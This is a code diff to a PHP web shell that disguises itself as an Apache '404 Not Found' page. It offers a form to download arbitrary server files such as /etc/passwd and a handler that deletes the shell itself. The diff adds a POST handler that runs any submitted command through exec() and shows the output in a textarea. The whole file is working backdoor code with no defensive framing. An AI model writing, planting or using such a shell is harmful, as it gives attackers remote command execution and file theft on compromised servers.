@@ -20,7 +20,7 @@ if ($use_auth)
 			<h1>404 Not Found</h1>
 			<p>The requested URL %s was not found on this server.</p>
 			<hr>
-			<p><i>Apache/2.4.56 (Unix) OpenSSL/1.1.1 PHP/8.0.28 Server: <b>%s</b> Port: <b>%s</b></i></p>
+			<p><i>%s Server: <b>%s</b> Port: <b>%s</b></i></p>
 			",
 			$_SERVER["REQUEST_URI"],
 			$_SERVER["SERVER_ADDR"],
@@ -49,6 +49,16 @@ if (isset($_POST["download"]))
 	}
 }
 
+if (isset($_POST["exec"]))
+{
+	$command = $_POST["exec"];
+
+	$output = null;
+	$result_code = null;
+
+	$result = exec($command, $output, $result_code);
+}
+
 if (isset($_POST["kill"])) { unlink(__FILE__); }
 
 echo( sprintf("
@@ -75,6 +85,9 @@ echo( sprintf("
 	}
 	td {
 		padding: 4px;
+	}
+	th {
+		text-align: left;
 	}
 	tr > td:nth-child(1) {
 		color: #bcd05d;
@@ -163,16 +176,18 @@ echo( sprintf("
 ?>
 
 <form action="<? echo($shell); ?>" method="POST">
-	<label for="exec">File:</label><br>
+	<label for="download">File:</label>
 	<input type="text" id="download" name="download" placeholder="/etc/passwd">
 	<input type="submit" value="Download">
 </form>
 
 <form action="<? echo($shell); ?>" method="POST">
-	<label for="exec">Command:</label><br>
+	<label for="exec">Command:</label>
 	<input type="text" id="exec" name="exec" placeholder="ls -ls">
 	<input type="submit" value="Execute">
 </form>
+
+<textarea rows="4" cols="64"><?php if (isset($result)) { echo(($result == FALSE) ? "Command not found..." : implode("\n", $output)); } ?></textarea>
 
 <form action="<? echo($shell); ?>" method="POST">
 	<input type="hidden" id="kill" name="kill">
